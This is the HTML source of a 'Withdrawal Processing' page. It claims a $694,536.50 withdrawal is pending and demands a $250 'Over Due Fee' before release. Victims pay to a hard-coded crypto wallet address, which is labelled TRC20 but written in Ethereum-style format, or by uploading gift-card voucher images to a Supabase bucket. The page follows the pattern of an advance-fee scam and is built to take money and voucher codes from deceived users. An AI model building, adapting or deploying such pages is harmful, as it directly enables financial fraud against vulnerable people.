<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Processing</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background-color: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; }

        /* Spinner */
        .spinner-overlay { visibility: hidden; opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(30,41,59,0.95); display: flex; justify-content: center; align-items: center; z-index: 10; transition: opacity 0.2s; }
        .spinner-overlay.active { visibility: visible; opacity: 1; }
        .spinner { width: 50px; height: 50px; border: 5px solid #334155; border-top: 5px solid #f59e0b; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }

        /* Header & Badges */
        .icon-wrap { width: 80px; height: 80px; border-radius: 50%; background: rgba(245, 158, 11, 0.1); border: 2px solid rgba(245, 158, 11, 0.35); display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        h2 { font-size: 22px; font-weight: 700; color: #f8fafc; margin-bottom: 6px; }
        .subtitle { color: #94a3b8; font-size: 14px; margin-bottom: 22px; }
        .status-badge { display: inline-flex; align-items: center; gap: 7px; background: rgba(245, 158, 11, 0.1); border: 1px solid #f59e0b; padding: 6px 16px; border-radius: 20px; font-size: 12px; font-weight: 700; color: #f59e0b; margin-bottom: 22px; }

        /* Cards */
        .info-card { background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 18px 20px; margin-bottom: 20px; text-align: left; }
        .info-row { display: flex; justify-content: space-between; padding: 9px 0; border-bottom: 1px solid #1e293b; font-size: 13px; }
        .info-value.amber { color: #f59e0b; }

        /* Tabs & Panels */
        .tabs { display: grid; grid-template-columns: 1fr 1fr; margin-bottom: 22px; border-radius: 8px; overflow: hidden; border: 1px solid #334155; }
        .tab-btn { padding: 12px; background: transparent; border: none; color: #94a3b8; font-size: 14px; font-weight: 600; cursor: pointer; }
        .active-crypto { background-color: #0f172a; color: #38bdf8; }
        .active-voucher { background-color: #0f172a; color: #f59e0b; }
        .panel { display: none; }
        .panel.active { display: block; }
        
        .btn { background-color: #2563eb; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .btn.amber { background-color: #d97706; }
        .address-input { width: 100%; padding: 13px; background: #0f172a; border: 2px solid #334155; color: #fff; border-radius: 8px; margin-bottom: 10px; }
        .upload-zone { border: 2px dashed #334155; padding: 30px; text-align: center; cursor: pointer; position: relative; border-radius: 10px; margin-bottom: 14px; }
        .upload-zone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
    </style>
</head>
<body>
<div class="container">
    <div class="spinner-overlay" id="loading-spinner"><div class="spinner"></div></div>

    <div class="icon-wrap"><svg viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2.2" width="38"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
    <h2>Withdrawal Processing</h2>
    <p class="subtitle">Your withdrawal request of <strong>$694,536.50</strong> is currently under review.</p>
    <div class="status-badge">⏳ PROCESSING</div>

    <div class="info-card">
        <div class="info-row"><span>Amount</span><span>$694,536.50</span></div>
        <div class="info-row"><span>Over Due Fee</span><span class="info-value amber">$250.00</span></div>
    </div>

    <div class="tabs">
        <button class="tab-btn active-crypto" id="tab-crypto" onclick="switchTab('crypto')">💎 TRC20</button>
        <button class="tab-btn" id="tab-voucher" onclick="switchTab('voucher')">🎟️ Voucher</button>
    </div>

    <div class="panel active" id="panel-crypto">
        <input class="address-input" value="0x7C3eFfee94c4D79A951FC51f62201bD88785ACF8" readonly>
        <button class="btn" onclick="alert('Noted')">I've Sent the Payment</button>
    </div>

    <div class="panel" id="panel-voucher">
        <div class="upload-zone" id="upload-zone">
            <input type="file" id="file-input" accept="image/*" onchange="handleFile(this.files[0])">
            <h3>Tap to upload voucher</h3>
        </div>
        <button class="btn amber" id="voucher-btn" disabled onclick="uploadVoucher()">Submit Voucher</button>
    </div>
</div>

<script>
    const supabaseClient = supabase.createClient('https://kmjmqrrmzdtovovzigxk.supabase.co', 'sb_publishable_y8Ai2hQcJfHSU5ilkEFCSg_lmh1_leb');
    let selectedFile = null;

    function switchTab(tab) {
        document.getElementById('panel-crypto').classList.toggle('active', tab === 'crypto');
        document.getElementById('panel-voucher').classList.toggle('active', tab === 'voucher');
        document.getElementById('tab-crypto').className = tab === 'crypto' ? 'tab-btn active-crypto' : 'tab-btn';
        document.getElementById('tab-voucher').className = tab === 'voucher' ? 'tab-btn active-voucher' : 'tab-btn';
    }

    function handleFile(file) {
        selectedFile = file;
        document.getElementById('voucher-btn').disabled = !file;
    }

    async function uploadVoucher() {
        if (!selectedFile) return;
        document.getElementById('loading-spinner').classList.add('active');
        const { error } = await supabaseClient.storage.from('vouchers').upload(`public/${Date.now()}_${selectedFile.name}`, selectedFile);
        document.getElementById('loading-spinner').classList.remove('active');
        if (error) alert('Upload failed: ' + error.message);
        else alert('Voucher submitted for review!');
    }
</script>
</body>
</html>
